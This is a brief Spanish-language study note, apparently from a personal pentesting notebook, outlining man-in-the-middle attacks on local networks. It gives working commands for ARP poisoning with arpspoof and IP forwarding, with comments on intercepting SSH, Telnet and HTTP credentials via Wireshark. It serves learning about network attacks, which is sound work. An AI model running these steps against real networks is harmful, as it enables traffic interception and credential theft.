# Ataques basados en red

Tags: #Network #Attack 

## Ataques de red 

```bash 
1. Servicios de red 'ARP, DHCP, SMB, FTP, Telnet, SSH'

# Ataques comunes 
1. Man in the middle

```

```bash 
1. Usar 'Nmap' para conocer las demas IPs de la red
2. Usar 'Wireshark' para capturar trafico de la red y cuando se envian credenciales en el protocolo HTTP
3. Usar 'Tshark' para capturar el trafico desde la consola 
4. Envenenamiento del protocolo ARP
5. Analizar el tráfico Wifi
```

## Envenenamiento ARP

```bash 
❯ echo 1 > /proc/sys/net/ipv4/ip_forward                # Hacemos 'echo' a nuestro estandar
❯ arpspoof -i eth0 -t <IP.1> -r <IP.2>                  # Haremos el envenenamiento a la red 
	# suplantaremos la segunda 'IP.2' y nos haremos pasar por ella
	# Cuando IP.1 envie el trafico, no lo hara a la real IP.2 sino a nosotros como atacantes
	# Estaremos interceptando el trafico con 'Wireshark'
	# Esto ayuda cuando la IP.1 tiene corriendo servicios como 'SSH, Telnet' y que podemos obtener credenciales validas
```
